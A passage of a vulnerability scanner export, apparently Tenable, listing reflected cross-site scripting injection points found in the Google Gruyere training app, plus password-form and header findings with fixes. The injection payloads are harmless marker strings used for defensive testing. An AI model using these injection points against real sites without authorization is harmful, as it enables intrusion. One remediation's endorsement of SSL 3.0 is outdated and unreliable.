_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"25d73c04-3019-4e95-8a71-045b7e2b0a57",2022-03-15T21:06:17.432Z,2022-03-15T16:14:14Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 |  script:"";tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | _refreshsnippets(""563265819128830739647592760263700851280"", ""cheddar script:"";tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//"")

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"2603de5a-ee54-425e-b332-aaeb4e0d6e5c",2022-03-15T21:06:17.432Z,2022-03-15T17:04:28Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert content directly into an HTML tag. For example `<INJECTION_HERE href=.......etc>` where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98105,"Cross-Site Scripting (XSS) in HTML tag",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"2608d85c-0ed5-4b0f-889a-51d263410059",2022-03-15T21:06:17.432Z,2022-03-15T18:14:30Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/656501648683287335357107855369111942818/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | ' tenable_wasscan_xss_in_tag='c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd' blah='

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"26a4ef7c-6507-4a79-bebb-c97c364ce4c6",2022-03-15T18:42:41.743Z,2022-03-15T17:31:06Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload.gtl with input fields : 
- upload_file (file)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"279a8c51-3226-4d0d-9185-f2beb0dd86aa",2022-03-15T21:06:17.432Z,2022-03-15T13:51:15Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile?action=new&uid=81&pw=nessus_was_textlpaaugw3&is_author=True' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The HTTP 'X-XSS-Protection' response header is a feature of modern browsers that allows websites to control their XSS auditors.

The server did not return a correct 'X-XSS-Protection' header, which means that this website could be at risk of a Cross-Site Scripting (XSS) attack.

If legacy browsers support is not needed, it is recommended to use Content-Security-Policy without allowing unsafe-inline scripts instead.","HTTP Security Header",112527,"Disabled 'X-XSS-Protection' Header",,2018-11-27T00:00:00Z,2021-04-13T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xxxsp, https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection",Info,"Configure your web server to include an 'X-XSS-Protection' header with a value of '1; mode=block'.",,"27bae81e-0f02-4a58-ac66-6d4cac898e4d",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"The scanner detected that the X-XSS-Protection header is set with an overpermissive value in the target application response.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"2832cd82-6750-47d5-aab0-e6d463843fbe",2022-03-15T18:42:41.743Z,2022-03-15T16:54:38Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newaccount.gtl with input fields : 
- action (hidden)
- uid (text)
- pw (password)
- is_author (hidden)

This form is submitted by using the following action : http://google-gruyere.appspot.com/361357029172560933265350706939995878846/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"2b5cd90d-03f3-4d11-9783-04c7a20e17c9",2022-03-15T18:42:41.743Z,2022-03-15T17:24:29Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scan detected that some XHR requests seem to call an API. This API may be scanned with WAS API Scanning",General,112616,"API Detected",,2020-10-21T00:00:00Z,2020-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"2e53deef-65be-460b-b550-1c295b31a154",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"API endpoints have been detected for the following host(s):
- http://google-gruyere.appspot.com",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"303ef772-6f70-489e-921a-a6daf1996206",2022-03-15T21:06:17.432Z,2022-03-15T19:53:33Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/656501648683287335357107855369111942818/login"">
  <input type=""text"" name=""uid"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""submit"" value=""Login"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"3320a5cd-43b8-4e0f-90a9-d7c3868bbfb0",2022-03-15T18:42:41.743Z,2022-03-15T18:19:48Z,"A response has been received with a response code '304' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'http://google-gruyere.appspot.com/static/codeindex.html'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"36bc93df-8a8c-4fb0-9c0f-661c6af7f35e",2022-03-15T21:06:17.432Z,2022-03-15T18:56:26Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/563265819128830739647592760263700851280/upload.gtl with input fields : 
- upload_file (file)

This form is submitted by using the following action : http://google-gruyere.appspot.com/563265819128830739647592760263700851280/upload2",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"36e4a6c3-6fba-4eb7-88c7-c78fe4469bd9",2022-03-15T18:42:41.743Z,2022-03-15T16:49:18Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/login' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"This plugin displays information about the SSL/TLS versions supported by remote server for HTTPS connection.",SSL/TLS,112530,"SSL/TLS Versions Supported",,2018-10-03T00:00:00Z,2020-10-02T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"373f3698-8190-46a8-996e-9c8db45b7ea1",2022-03-15T18:42:41.743Z,2022-03-15T16:46:08Z,"
    Protocol   Supported
    ---------------------
    SSL 2.0    No
    SSL 3.0    No
    TLS 1.0    Yes
    TLS 1.1    Yes
    TLS 1.2    Yes
    TLS 1.3    Yes",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"3740f9f5-9dc4-478a-8b7e-db6f4912c661",2022-03-15T21:06:17.432Z,2022-03-15T19:28:52Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/saveprofile"">
  <input type=""hidden"" name=""action"" value=""update"">
  </input>
  <input type=""text"" value="""" name=""name"" maxlength=""16"">
  </input>
  <input type=""password"" name=""oldpw"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""text"" value="""" name=""icon"">
  </input>
  <input type=""text"" size=""50"" value="""" name=""web_site"">
  </input>
  <input type=""text"" value="""" name=""color"">
  </input>
  <textarea name=""private_snippet"" rows=""10"" style=""width:100%"">
  </textarea>
  <input type=""submit"" value=""Update"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Detects any known CAPTCHA products being used on a page.","Web Applications",98083,"CAPTCHA Detection",,2017-03-31T00:00:00Z,2017-10-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"37527f46-b4ab-4df0-90fd-1a7c52291de5",2022-03-15T18:42:41.743Z,2022-03-15T18:06:22Z,"A Recaptcha CAPTCHA has been detected on https://google-gruyere.appspot.com/resetbutton/425575187579520270957883614548769509881 due to tag  <div class=""g-recaptcha"" data-sitekey=""6LfKTycUAAAAAOLes3JooIZ0gi8BNy81n_mY3fdD"">",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"37d3595a-f9e9-489a-bac8-c98394f839ac",2022-03-15T21:06:17.432Z,2022-03-15T15:30:31Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into an HTML event attribute. For example `<div onmouseover=""x=INJECTION_HERE""</div>`, where `INJECTION_HERE` represents the location where the scanner payload was detected.","Cross Site Scripting",98108,"Cross-Site Scripting (XSS) in event tag of HTML element",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"37fba484-e3b6-40df-b600-c1a9555b00dd",2022-03-15T21:06:17.432Z,2022-03-15T18:14:30Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/656501648683287335357107855369111942818/snippets.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 |  "";tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | _refreshsnippets(""656501648683287335357107855369111942818"", ""cheddar "";tenable_wasscan_xss_in_element_event=c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd//"")

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"38233e6e-73b8-4ee7-9020-1e41a4c94b42",2022-03-15T21:06:17.432Z,2022-03-15T17:14:22Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
